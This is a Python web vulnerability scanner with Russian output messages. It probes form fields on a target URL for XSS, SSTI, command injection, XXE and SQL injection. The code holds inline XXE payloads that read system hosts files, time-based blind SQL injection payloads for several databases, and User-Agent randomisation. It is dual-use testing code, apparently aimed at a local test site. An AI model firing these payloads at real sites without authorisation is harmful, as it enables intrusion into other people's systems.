import requests
from bs4 import BeautifulSoup
import json
import time
from fake_useragent import UserAgent
import re
from termcolor import cprint
import os

class VulnScan:

    def __init__(self, src):
        self.src = src
        if not self.src.endswith('/'):
            self.src = self.src + '/'
        
        self.user_agent = {
            'User-Agent': UserAgent().random
        }
        self.clearresponse = requests.get(src, headers=self.user_agent)
        self.inputs = []

    def LoadfFromJson(self, filename):
        with open(filename) as file:
            payloads = json.load(file)
        return payloads

    def PrepareInput(self):
        response = requests.get(self.src,headers=self.user_agent)
        soup = BeautifulSoup(response.content, 'html.parser')

        for form in soup.find_all('form'):
            for input in form.find_all('input'):
                if input.get('type') == 'text':
                    self.inputs.append(input.get('name'))    
                    
    def XSSScaner(self):
        cprint("\n[I] Начало сканирования на уязвимость к XSS", "magenta")
        payloads = self.LoadfFromJson(os.path.join("dict","XSS.json"))
        count = 0
        for input in self.inputs:
            for payload in payloads:
                data = {input: payload}
                response = requests.post(self.src, data=data)
                soup = BeautifulSoup(response.content,'html.parser')
                scripts = soup.find_all("script")
                for script in scripts:
                    if "alert('XSS')" in script.text:
                        cprint(f'[+] XSS уязвимость была найдена в поле: {input} с использованием запроса: {payload}', "green")
                        count += 1
        if count == 0:
            print("[-] Не найдено XSS уязвимостей")
        else:
            cprint(f"[+] Было найдено: {count} XSS уязвимостей", "green")

    def SSTIScanner(self):
        cprint("\n[I] Начало сканирования на уязвимость к SSTI", "magenta")
        count = 0
        payloads = self.LoadfFromJson(os.path.join("dict","SSTI.json"))
        match_before = re.findall(r'49',self.clearresponse.text)
        for input in self.inputs:
            for payload in payloads:
                data = {input: payload}
                response = requests.post(self.src, data=data,headers=self.user_agent)
                match_after = re.findall(r'49', response.text)
                if len(match_after) > len(match_before):
                    cprint(f'[+] SSTI уязвимость была найдена в поле: {input} с использованием запроса: {payload}', 'green')
                    count += 1
        if count == 0:
            print("[-] Не найдено SSTI уязвимостей")
        else:
            cprint(f"[+] Было найдено: {count} SSTI уязвимостей", "green")

    def CIScanner(self):
        cprint("\n[I] Начало сканирования на уязвимость к command injection", "magenta")
        count = 0
        payloads = self.LoadfFromJson(os.path.join("dict","CI.json"))
        match_before = re.findall(r"localhost|127\.0\.0\.1", self.clearresponse.text)
        for input in self.inputs:
            for payload in payloads:
                data = {input: payload}
                response = requests.post(self.src, data=data,headers=self.user_agent)
                match_after = re.findall(r"localhost|127\.0\.0\.1", response.text)
                if len(match_after) > len(match_before):
                    cprint(f'[+] Command injection уязвимость была найдена в поле: {input} с использованием запроса: {payload}', "green")
                    count += 1
        if count == 0:
            print("[-] Не найдено command injection уязвимостей")
        else:
            cprint(f"[+] Было найдено: {count} CI уязвимостей", "green")

    

    def XXEScaner(self):
        cprint("\n[I] Начало сканирования на уязвимость к XXE", "magenta")
        payload = "<!--?xml version=\"1.0\" ?--> <!DOCTYPE foo [<!ENTITY example SYSTEM \"/etc/hosts\"> ]> <data>&example;</data>"
        match_before = re.findall(r"localhost|127\.0\.0\.1", self.clearresponse.text)
        response = requests.post(self.src, data=payload,headers=self.user_agent)
        match_after = re.findall(r"localhost|127\.0\.0\.1", response.text)
        if len(match_after) > len(match_before)  and response.status_code != 404:
            cprint(f"[+] Найдена XXE уязвимость с использованием нагрузки: {payload}", 'green')
            print("[I] Возможно целевая система Linux")
            return

        payload = "<!--?xml version=\"1.0\" ?--> <!DOCTYPE foo [<!ENTITY example SYSTEM \"C:\windows\system32\drivers\etc\hosts\"> ]> <data>&example;</data>"
        match_before = re.findall(r"localhost|127\.0\.0\.1", self.clearresponse.text)
        response = requests.post(self.src, data=payload,headers=self.user_agent)
        match_after = re.findall(r"localhost|127\.0\.0\.1", response.text)
        if len(match_after) > len(match_before) and response.status_code != 404:
            cprint(f"[+] Найдена XXE уязвимость с использованием нагрузки: {payload}", 'green')
            print("[I] Возможно целевая система Windows")
            return
        print("[-] Не найдено XXE уязвимостей")

    def SendPayloadAndCheckTime(self,input,payloads):
        for payload in payloads:
            data = {input: payload}
            start_time = time.time()
            response = requests.post(self.src, data=data,headers=self.user_agent)
            response_time = time.time() - start_time
            if response_time > 5:
                return True
        return False
    
    def CheckBackEnd(self, input):
        cprint("\t[I] Попытка определить используемую БД", "magenta")
        #Проверяю на Mysql
        payloads = ["1' + sleep(5) ", "1' and sleep(5) ", "1' && sleep(5) ", "1' | sleep(5) " ]
        if self.SendPayloadAndCheckTime(input,payloads):
            cprint("\t[+] Используется MySql", "green")
            return

        #Проверяю на Postgresql
        payloads = ["1' || pg_sleep(5) "]
        if self.SendPayloadAndCheckTime(input,payloads):
            cprint("\t[+] Используется PostgreSql", "green")
            return
        
        #Проверяю на MSQL
        payloads = ["1' WAITFOR DELAY '0:0:5' "]
        if self.SendPayloadAndCheckTime(input,payloads):
            cprint("\t[+] Используется MSQL", "green")
            return 
    
        #Проверяю на Oracle
        payloads = ["1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ", "1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',5) " ]
        if self.SendPayloadAndCheckTime(input,payloads):
            cprint("\t[+] Используется Oracle", "green")
            return
        
        #Проверяю на SQLite
        payloads = ["1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) ", "1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) " ]
        if self.SendPayloadAndCheckTime(input,payloads):
            cprint("\t[+] Используется SQLite", "green")
            return
        print("\t[-] Не удалось определить сервер")
            
    def SQLScaner(self):
        cprint("\n[I] Начало сканирования на уязвимость к SQLi","magenta")
        vulninput = ""
        count = 0
        payloads = self.LoadfFromJson(os.path.join("dict","SQL.json"))
        match_before = re.findall(r'(?i)(warning|error|ora|sql)',self.clearresponse.text)
        for input in self.inputs:
            for payload in payloads:
                data = {input: payload}
                response = requests.post(self.src, data=data,headers=self.user_agent)
                soup = BeautifulSoup(response.content,'html.parser')
                
                #проверяю код ответа
                if (response.status_code != 200 and response.status_code != 404):
                    cprint(f"[+] SQLi уязвимость была найдена в поле: {input} с использованием запроса: {payload}", "green")
                    count += 1
                    continue
            
                #ищу ошибку php 
                if (soup.findAll("table", {"class": "xdebug-error"}) != []):            
                    cprint(f"[+] SQLi уязвимость была найдена в поле: {input} с использованием запроса: {payload}", "green")
                    count += 1
                    continue

                #поиск по ключевым словам в сообщении об ошибке
                match_after = re.findall(r'(?i)(warning|error|ora|sql)',response.text)
                if len(match_after) > len(match_before):
                    count += 1
                    cprint(f"[+] SQLi уязвимость была найдена в поле: {input} с использованием запроса: {payload}", "green")
                    break
        
            #Определение сервера БД
            if count == 1:
                vulninput = input
        self.CheckBackEnd(vulninput)

        if count == 0:
            print("[-] Не найдено SQLi уязвимостей")
        else:
            cprint(f"[+] Было найдено: {count} SQLi уязвимостей", "green")

    def ScanAll(self):
        cprint(f"\n[I] Начало сканирования на уязвимости по адресу: {self.src}","cyan")
        self.PrepareInput()
        self.XSSScaner()
        self.SQLScaner()
        self.XXEScaner()
        self.SSTIScanner()
        self.CIScanner()       

if __name__ == "__main__":
    
    #VS = VulnScan("https://alexbers.com/sql/1.php")
    VS = VulnScan("http://127.0.0.1:8012/Tests//XSS")
    VS.ScanAll()